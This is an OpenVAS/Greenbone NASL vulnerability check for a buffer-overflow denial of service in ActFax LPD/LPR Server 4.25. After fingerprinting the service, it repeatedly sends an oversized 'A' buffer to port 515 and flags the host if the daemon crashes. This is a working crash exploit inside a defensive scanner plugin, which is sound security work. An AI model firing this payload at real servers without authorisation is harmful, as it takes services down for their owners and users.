# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900272");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("ActFax LPD/LPR Server 4.25 DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "find_service1.nasl", "find_service2.nasl");
  script_require_ports("Services/lpd", 515);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16176");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98539");

  script_tag(name:"summary", value:"ActFax LPD/LPR Server is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted LPD request and checks if the service is still
  responding.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
  denial of service.");

  script_tag(name:"affected", value:"ActiveFax version 4.25 (Build 0221). Other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is caused by a buffer overflow error when processing
  packets sent to port 515/TCP, which could be exploited by remote unauthenticated attackers to
  crash an affected daemon or execute arbitrary code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:515, proto:"lpd");

if(!soc = open_sock_tcp(port))
  exit(0);

## Line Printer Daemon Protocol
## LPQ: Print Long form of queue status request
req = raw_string(0x04) + 'VTTest' + raw_string(0x0a);
send(socket:soc, data:req);
res = recv(socket:soc, length:256);
close(soc);

if(!res || "ActiveFax Server" >!< res)
  exit(0);

flag = 0;

for(i=0; i<5; i++)
{
  soc1 = open_sock_tcp(port);

  ## Exit if it's not able to open socket first time
  ## and server is crashed if it's not first time
  if(!soc1)
  {
    if(flag == 0){
      exit(0);
    }
    else {
      security_message(port);
      exit(0);
    }
  }

  flag = 1;

  ## Send specially crafted packet
  send(socket:soc1, data:string(crap(length: 1024, data:"A"), '\r\n'));

  close(soc1);
  sleep(2);
}

soc2 = open_sock_tcp(port);
if(!soc2){
  security_message(port);
  exit(0);
}
close(soc2);
